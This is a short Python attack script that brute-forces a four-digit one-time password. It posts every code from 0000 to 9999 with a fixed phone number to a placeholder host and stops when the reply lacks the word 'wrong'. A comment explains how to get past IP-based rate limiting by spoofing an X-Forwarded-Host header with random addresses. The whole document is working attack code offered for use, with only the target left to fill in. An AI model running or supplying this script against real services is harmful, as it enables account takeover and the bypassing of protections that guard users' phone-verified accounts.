import requests
#Don't forget to add hostname and nessessary information, you can by pass ip checking by adding X-Forwarded-Host headers 
#ex: X-Forwarded-Host: 10.10.x.y  (with x and y are random values)
def send_otp(otp):
    burp0_url = "Host_name_here"
    burp0_headers = {"Cache-Control": "max-age=0", 
                    "sec-ch-ua": "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", 
                    "Accept-Language": "en-US", 
                    "Upgrade-Insecure-Requests": "1", 
                    "Origin": "Host_name_here", 
                    "Content-Type": "application/x-www-form-urlencoded", 
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
                    "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", 
                    "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
                    "Referer": "Host_name_here",
                    "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
    burp0_data = {"phone": "0123456789", "otp": otp}
    r=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return r.text
for i in range(0,10000):
    otp = str(i).rjust(4, '0')
    print(otp)
    response = send_otp(otp)
    if "wrong" not in response:
        print("Ola! The OTP is: ", otp)
        break
